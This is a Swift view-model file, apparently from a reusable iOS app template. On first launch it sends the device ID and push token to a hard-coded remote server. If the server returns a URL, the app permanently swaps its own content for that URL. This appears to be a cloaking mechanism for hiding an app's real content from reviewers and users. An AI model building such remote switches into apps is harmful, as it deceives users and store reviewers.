import UserNotifications
import Foundation
import Network
import Combine
//import AppsFlyerLib

enum Presented {
    case splash, main, changed
}

enum Locked: String {
    case main, changed
}

@MainActor
final class LoaderViewModel: ObservableObject {
    @Published var presented: Presented = .splash
    @Published var errorMessage: String?
    @Published var isSplash: Bool = false
    @Published var mailLink: String?

    let link = "https://coolsterclickwillow.click/v1/public/install" // ИЗМЕНИТЬ

    private var monitor: NWPathMonitor?
    private let queue = DispatchQueue(label: "NetworkMonitor")
    private var resolved = false

    private var pushAnswered = false

    private let routeLockKey = "route.lock"
    private let storedURLKey = "route.alter.url"

    private var fcmObserver: NSObjectProtocol?
    private var attObserver: NSObjectProtocol?

    private var latestFCMToken: String?
    private var lastFCMChange: Date = .distantPast

    private var refreshInFlight = false
    private var lastRefreshToken: String?
    private var lastRefreshAt: Date = .distantPast
    private let refreshCooldown: TimeInterval = 1.2

    private let fcmKey = "fcmToken"

    private let attResolvedKey = "attResolved"
    private let attAuthorizedKey = "attAuthorized"
    private let deviceIdKey = "deviceId"

    private let installCompletedKey = "installCompleted"
    private let installFCMTokenKey = "installFCMToken"
    private let installDeviceKey = "installDevice"
    private let installAppsFlyerIdKey = "installAppsFlyerId"

    private let bundleIdToSend = "6761258863" // ИЗМЕНИТЬ

    init() {
        print("🧩 [LoaderVM] init")

        setupObservers()

        if let locked = loadLock() {
            print("🧩 [LoaderVM] loadLock found: \(locked.rawValue)")
            apply(locked, url: UserDefaults.standard.string(forKey: storedURLKey))
            resolved = true
            return
        }

        firstStart()
    }

    deinit {
        print("🧩 [LoaderVM] deinit")
        if let obs = fcmObserver { NotificationCenter.default.removeObserver(obs) }
        if let obs = attObserver { NotificationCenter.default.removeObserver(obs) }
        monitor?.cancel()
    }

    func onPushAnswered() {
        print("🧩 [LoaderVM] onPushAnswered()")
        pushAnswered = true
    }

    private func setupObservers() {
        fcmObserver = NotificationCenter.default.addObserver(
            forName: .fcmTokenDidUpdate,
            object: nil,
            queue: nil
        ) { [weak self] note in
            guard let self else { return }

            let token = (note.userInfo?["token"] as? String)
            ?? UserDefaults.standard.string(forKey: self.fcmKey)

            guard let token, !token.isEmpty else {
                print("🧩 [LoaderVM] fcmTokenDidUpdate: empty token")
                return
            }

            Task { @MainActor in
                print("🧩 [LoaderVM] fcmTokenDidUpdate: \(token)")
                self.updateFCMFromNotification(token)
                self.tryRefreshIfPossible(candidateToken: token, reason: "fcmDidUpdate")
            }
        }

//        attObserver = NotificationCenter.default.addObserver(
//            forName: .attDidResolve,
//            object: nil,
//            queue: nil
//        ) { [weak self] _ in
//            guard let self else { return }
//            Task { @MainActor in
//                print("🧩 [LoaderVM] attDidResolve notification")
//                let tok = self.latestFCMToken ?? (UserDefaults.standard.string(forKey: self.fcmKey) ?? "")
//                self.tryRefreshIfPossible(candidateToken: tok, reason: "attDidResolve")
//            }
//        }
    }

    private func updateFCMFromNotification(_ token: String) {
        if token != latestFCMToken {
            print("🧩 [LoaderVM] latestFCMToken updated: \(latestFCMToken ?? "nil") → \(token)")
            latestFCMToken = token
            lastFCMChange = Date()
        }
    }
}

private extension LoaderViewModel {

    func loadLock() -> Locked? {
        guard let raw = UserDefaults.standard.string(forKey: routeLockKey) else { return nil }
        return Locked(rawValue: raw)
    }

    func saveLock(_ locked: Locked) {
        print("🧩 [LoaderVM] saveLock: \(locked.rawValue)")
        UserDefaults.standard.set(locked.rawValue, forKey: routeLockKey)
    }

    func apply(_ locked: Locked, url: String?) {
        print("🧩 [LoaderVM] apply lock: \(locked.rawValue), url: \(url ?? "nil")")
        switch locked {
        case .main:
            presented = .main
        case .changed:
            mailLink = url ?? link
            presented = .changed
        }
    }

    func firstStart() {
    print("🧩 [LoaderVM] firstStart()")
//            
//            // 👇 NEW LOGIC: Check for Simulator
//            #if targetEnvironment(simulator)
//                // 1. IF SIMULATOR: Generate a FAKE token
//                print("💻 Running on Simulator: Generating FAKE Token")
//                Task { @MainActor in
//                    self.latestFCMToken = "SIMULATOR_TEST_TOKEN_\(UUID().uuidString)"
//                    
//                    // Add a small pause to simulate network delay
//                    try? await Task.sleep(nanoseconds: 1 * 1_000_000_000)
//                }
//            #else
//                // 2. IF REAL DEVICE: Use honest Firebase logic
//                Messaging.messaging().token { token, error in
//                    Task { @MainActor in
//                        if let token = token {
//                            print("🧩 [LoaderVM] FCM Token received: \(token)")
//                            self.latestFCMToken = token
//                        } else {
//                            print("⚠️ [LoaderVM] Error fetching FCM: \(error?.localizedDescription ?? "unknown")")
//                        }
//                    }
//                }
//            #endif
//       
        
        presented = .splash
        errorMessage = nil

        let pathMonitor = NWPathMonitor()
        monitor = pathMonitor

        pathMonitor.pathUpdateHandler = { [weak self] path in
            Task { @MainActor [weak self] in
                guard let s = self else { return }
                guard !s.resolved else { return }

                if path.status == .satisfied {
                    print("🧩 [LoaderVM] Network satisfied → allowOnceFromLink()")
                    await s.allowOnceFromLink()
                } else {
                    print("🧩 [LoaderVM] Network NOT satisfied → go main")
                    s.saveLock(.main)
                    s.apply(.main, url: nil)
                    s.resolved = true
                    s.monitor?.cancel()
                }
            }
        }

        pathMonitor.start(queue: queue)
    }

    func waitForPushAnswer(timeoutSeconds: Double = 0.4) async {
        print("🧩 [LoaderVM] waitForPushAnswer(timeout=\(timeoutSeconds)) start (non-blocking)")
        let deadline = Date().addingTimeInterval(timeoutSeconds)
        while Date() < deadline {
            if pushAnswered {
                print("🧩 [LoaderVM] waitForPushAnswer: pushAnswered=true")
                return
            }
            try? await Task.sleep(nanoseconds: 120_000_000)
        }
        print("🧩 [LoaderVM] waitForPushAnswer: timeout (non-blocking)")
    }

    func waitForATTResolved(timeoutSeconds: Double = 30.0) async -> (authorized: Bool, device: String) {
        print("🧩 [LoaderVM] waitForATTResolved(timeout=\(timeoutSeconds)) start")
        let deadline = Date().addingTimeInterval(timeoutSeconds)

        while Date() < deadline {
            let resolved = UserDefaults.standard.bool(forKey: attResolvedKey)
            if resolved {
                let authorized = UserDefaults.standard.bool(forKey: attAuthorizedKey)
                let device = UserDefaults.standard.string(forKey: deviceIdKey) ?? UUID().uuidString
                let finalDevice = device.isEmpty ? "00000000-0000-0000-0000-000000000000" : device
                print("🧩 [LoaderVM] waitForATTResolved end → authorized=\(authorized), device=\(finalDevice)")
                return (authorized, finalDevice)
            }
            try? await Task.sleep(nanoseconds: 150_000_000)
        }

        let authorized = UserDefaults.standard.bool(forKey: attAuthorizedKey)
        let device = UserDefaults.standard.string(forKey: deviceIdKey) ?? ""
        let finalDevice = device.isEmpty ? "00000000-0000-0000-0000-000000000000" : device
        print("🧩 [LoaderVM] waitForATTResolved timeout → authorized=\(authorized), device=\(finalDevice)")
        return (authorized, finalDevice)
    }

    func waitForAppsFlyerId(timeoutSeconds: Double = 2.0) async -> String {
//        let deadline = Date().addingTimeInterval(timeoutSeconds)
//        while Date() < deadline {
//            let id = AppsFlyerLib.shared().getAppsFlyerUID()
//            if !id.isEmpty { return id }
//            try? await Task.sleep(nanoseconds: 150_000_000)
//        }
        return ""
    }

    func buildIdentifiers(attAuthorized: Bool, deviceFromATT: String, appsFlyerIdRaw: String) -> (deviceToSend: String, appsFlyerIdToSend: String) {
        let fallbackDeviceID = UUID().uuidString
        let af = appsFlyerIdRaw.isEmpty ? "" : appsFlyerIdRaw
        
        if !af.isEmpty {
            if attAuthorized && !deviceFromATT.isEmpty && deviceFromATT != "00000000-0000-0000-0000-000000000000" {
                return (deviceFromATT, af)
            } else {
                return (af, af)
            }
        } else {
            if attAuthorized && !deviceFromATT.isEmpty && deviceFromATT != "00000000-0000-0000-0000-000000000000" {
                return (deviceFromATT, "")
            } else {
                return (fallbackDeviceID, "")
            }
        }
    }

    func waitForFirstFCMToken(timeoutSeconds: Double) async -> String? {
        print("🧩 [LoaderVM] waitForFirstFCMToken(timeout=\(timeoutSeconds)) start")
        let deadline = Date().addingTimeInterval(timeoutSeconds)

        while Date() < deadline {
            if let tok = latestFCMToken, !tok.isEmpty {
                print("🧩 [LoaderVM] waitForFirstFCMToken: from latestFCMToken=\(tok)")
                return tok
            }
            if let t = UserDefaults.standard.string(forKey: fcmKey), !t.isEmpty {
                print("🧩 [LoaderVM] waitForFirstFCMToken: from defaults=\(t)")
                return t
            }
            try? await Task.sleep(nanoseconds: 120_000_000)
        }

        let fallback = UserDefaults.standard.string(forKey: fcmKey)
        let final = (fallback?.isEmpty == false) ? fallback : nil
        print("🧩 [LoaderVM] waitForFirstFCMToken timeout → fallback: \(final ?? "nil")")
        return final
    }

    func waitForStableFCMToken(debounceSeconds: Double, timeoutSeconds: Double) async -> String? {
        print("🧩 [LoaderVM] waitForStableFCMToken(debounce=\(debounceSeconds), timeout=\(timeoutSeconds)) start")
        let deadline = Date().addingTimeInterval(timeoutSeconds)

        if latestFCMToken == nil,
           let t = UserDefaults.standard.string(forKey: fcmKey),
           !t.isEmpty {
            latestFCMToken = t
            lastFCMChange = Date()
            print("🧩 [LoaderVM] initial latestFCMToken from defaults: \(t)")
        }

        while Date() < deadline {
            try? await Task.sleep(nanoseconds: 150_000_000)

            let current = UserDefaults.standard.string(forKey: fcmKey)
            let normalized = (current?.isEmpty == false) ? current : nil

            if normalized != latestFCMToken {
                print("🧩 [LoaderVM] FCM changed: \(latestFCMToken ?? "nil") → \(normalized ?? "nil")")
                latestFCMToken = normalized
                lastFCMChange = Date()
            }

            if let tok = latestFCMToken,
               !tok.isEmpty,
               Date().timeIntervalSince(lastFCMChange) >= debounceSeconds {
                print("🧩 [LoaderVM] stable FCM token reached: \(tok)")
                return tok
            }
        }

        let fallback = UserDefaults.standard.string(forKey: fcmKey)
        let final = (fallback?.isEmpty == false) ? fallback : nil
        print("🧩 [LoaderVM] waitForStableFCMToken timeout → fallback: \(final ?? "nil")")
        return final
    }

    func waitForStableFCMTokenSmart(
        minWindowSeconds: Double = 6.0,
        debounceSeconds: Double = 3.2,
        maxWindowSeconds: Double = 10.0
    ) async -> String? {

        print("🧩 [LoaderVM] waitForStableFCMTokenSmart(min=\(minWindowSeconds), debounce=\(debounceSeconds), max=\(maxWindowSeconds)) start")

        let start = Date()
        let deadline = start.addingTimeInterval(maxWindowSeconds)

        while latestFCMToken == nil || latestFCMToken?.isEmpty == true {
            if let t = UserDefaults.standard.string(forKey: fcmKey), !t.isEmpty {
                latestFCMToken = t
                lastFCMChange = Date()
                print("🧩 [LoaderVM] initial latestFCMToken from defaults: \(t)")
                break
            }
            if Date() > deadline { break }
            try? await Task.sleep(nanoseconds: 120_000_000)
        }

        guard let first = latestFCMToken, !first.isEmpty else {
            let fallback = UserDefaults.standard.string(forKey: fcmKey)
            let final = (fallback?.isEmpty == false) ? fallback : nil
            print("🧩 [LoaderVM] waitForStableFCMTokenSmart: no token → fallback: \(final ?? "nil")")
            return final
        }

        let firstTokenTime = Date()
        print("🧩 [LoaderVM] first token captured: \(first)")

        while Date() < deadline {
            try? await Task.sleep(nanoseconds: 150_000_000)

            let current = UserDefaults.standard.string(forKey: fcmKey)
            let normalized = (current?.isEmpty == false) ? current : nil

            if normalized != latestFCMToken {
                print("🧩 [LoaderVM] FCM changed: \(latestFCMToken ?? "nil") → \(normalized ?? "nil")")
                latestFCMToken = normalized
                lastFCMChange = Date()
            }

            let sinceFirst = Date().timeIntervalSince(firstTokenTime)
            let sinceChange = Date().timeIntervalSince(lastFCMChange)

            if sinceFirst < minWindowSeconds { continue }

            if let tok = latestFCMToken, !tok.isEmpty, sinceChange >= debounceSeconds {
                print("🧩 [LoaderVM] stable token accepted: \(tok) (sinceFirst=\(sinceFirst)s)")
                return tok
            }
        }

        let fallback = UserDefaults.standard.string(forKey: fcmKey)
        let final = (fallback?.isEmpty == false) ? fallback : latestFCMToken
        print("🧩 [LoaderVM] waitForStableFCMTokenSmart timeout → \(final ?? "nil")")
        return final
    }

    func tryRefreshIfPossible(candidateToken: String, reason: String) {
        let installCompleted = UserDefaults.standard.bool(forKey: installCompletedKey)
        guard installCompleted else {
            print("🧩 [LoaderVM] refresh skip (\(reason)): installCompleted=false")
            return
        }

//        let attAuthorized = UserDefaults.standard.bool(forKey: attAuthorizedKey)
//        guard attAuthorized else {
//            print("🧩 [LoaderVM] refresh skip (\(reason)): attAuthorized=false")
//            return
//        }

        let token = candidateToken.isEmpty ? (UserDefaults.standard.string(forKey: fcmKey) ?? "") : candidateToken
        guard !token.isEmpty else {
            print("🧩 [LoaderVM] refresh skip (\(reason)): token empty")
            return
        }

        let installToken = UserDefaults.standard.string(forKey: installFCMTokenKey) ?? ""
        if token == installToken {
            print("🧩 [LoaderVM] refresh skip (\(reason)): token == installFCMToken")
            return
        }

        if token == lastRefreshToken {
            print("🧩 [LoaderVM] refresh skip (\(reason)): already refreshed same token")
            return
        }

        if refreshInFlight {
            print("🧩 [LoaderVM] refresh skip (\(reason)): inFlight=true")
            return
        }

        if Date().timeIntervalSince(lastRefreshAt) < refreshCooldown {
            print("🧩 [LoaderVM] refresh skip (\(reason)): cooldown")
            return
        }

        let device = UserDefaults.standard.string(forKey: installDeviceKey)
        ?? UserDefaults.standard.string(forKey: deviceIdKey)
        ?? ""

        guard !device.isEmpty, device != "unknown" else {
            print("🧩 [LoaderVM] refresh skip (\(reason)): device invalid (\(device))")
            return
        }

//        let appsFlyerId = UserDefaults.standard.string(forKey: installAppsFlyerIdKey)
//        ?? AppsFlyerLib.shared().getAppsFlyerUID()

        refreshInFlight = true
        lastRefreshToken = token
        lastRefreshAt = Date()

        print("🧩 [LoaderVM] RefreshAPI (\(reason)) → sending new token: \(token)")

        Task {
            do {
                try await NetworkManager.shared.refreshFCMToken(
                    bundle: bundleIdToSend,
                    fcmToken: token,
                    device: device,
                    appsFlyerId: "appsFlyerId"
                )
                await MainActor.run {
                    UserDefaults.standard.set(token, forKey: installFCMTokenKey)
                    self.refreshInFlight = false
                    print("🧩 [LoaderVM] RefreshAPI success")
                }
            } catch {
                await MainActor.run {
                    self.refreshInFlight = false
                    print("🧩 [LoaderVM] RefreshAPI error: \(error.localizedDescription)")
                }
            }
        }
    }

    func allowOnceFromLink() async {
        guard !resolved else {
            print("🧩 [LoaderVM] allowOnceFromLink aborted: resolved=true")
            return
        }

        print("🧩 [LoaderVM] allowOnceFromLink start (оптимизированная быстрая версия)")
        isSplash = true
        errorMessage = nil
        
        // Используем defer, чтобы гарантированно выключить сплэш при любом исходе
        defer {
            isSplash = false
            print("🧩 [LoaderVM] allowOnceFromLink end")
        }

        // Запускаем проверки параллельно
        async let pushTask: () = waitForPushAnswer(timeoutSeconds: 0.5)
        async let attTask = waitForATTResolved(timeoutSeconds: 2.0) // Для быстрого старта 2с — потолок
        
        _ = await pushTask
        let (attAuthorized, deviceFromATT) = await attTask
        
        print("🧩 [LoaderVM] Быстрые проверки завершены. ATT Auth: \(attAuthorized)")
        
        let appsFlyerIdRaw = "" // Если AppsFlyer выключен
        
        let ids = buildIdentifiers(
            attAuthorized: attAuthorized,
            deviceFromATT: deviceFromATT,
            appsFlyerIdRaw: appsFlyerIdRaw
        )

        let deviceToSend = ids.deviceToSend
        let appsFlyerIdToSend = ids.appsFlyerIdToSend
        
        // Собираем токен: сначала смотрим в память, потом в UserDefaults,
        // и если там пусто — даем Firebase 1.5 секунды на генерацию.
        let fcmToSend: String?
        if let latest = latestFCMToken, !latest.isEmpty {
            fcmToSend = latest
        } else if let stored = UserDefaults.standard.string(forKey: fcmKey), !stored.isEmpty {
            fcmToSend = stored
        } else {
            fcmToSend = await waitForFirstFCMToken(timeoutSeconds: 1.5)
        }
        
        let finalFCM = fcmToSend ?? ""
        print("🧩 [LoaderVM] Итоговый FCM для инсталла: '\(finalFCM)'")

        do {
            print("🧩 [LoaderVM] Вызываем InstallAPI...")
            let response = try await NetworkManager.shared.fetchInstallURL(
                bundle: bundleIdToSend,
                fcmToken: finalFCM,
                device: deviceToSend,
                appsFlyerId: appsFlyerIdToSend
            )

            // Сохраняем факт успешной регистрации
            UserDefaults.standard.set(true, forKey: installCompletedKey)
            if !finalFCM.isEmpty {
                UserDefaults.standard.set(finalFCM, forKey: installFCMTokenKey)
            }
            UserDefaults.standard.set(deviceToSend, forKey: installDeviceKey)

            let raw = response.url.trimmingCharacters(in: .whitespacesAndNewlines)
            print("🧩 [LoaderVM] InstallAPI вернул URL: \(raw)")

            if let url = URL(string: raw),
               let scheme = url.scheme,
               (scheme == "http" || scheme == "https"),
               !raw.isEmpty {
                UserDefaults.standard.set(raw, forKey: storedURLKey)
                saveLock(.changed)
                apply(.changed, url: raw)
            } else {
                print("⚠️ [LoaderVM] Невалидный URL или пустая строка → Main")
                saveLock(.main)
                apply(.main, url: nil)
            }

            resolved = true
            monitor?.cancel()
            
            // После того как WebView начал открываться, проверяем:
            // не прилетел ли за это время более свежий токен?
            let currentToken = latestFCMToken ?? finalFCM
            if !currentToken.isEmpty {
                Task {
                    tryRefreshIfPossible(candidateToken: currentToken, reason: "postInstallBackground")
                }
            }
            
        } catch {
            print("🧩 [LoaderVM] Ошибка InstallAPI: \(error.localizedDescription)")
            saveLock(.main)
            apply(.main, url: nil)
            resolved = true
            monitor?.cancel()
            errorMessage = error.localizedDescription
        }
    }
}
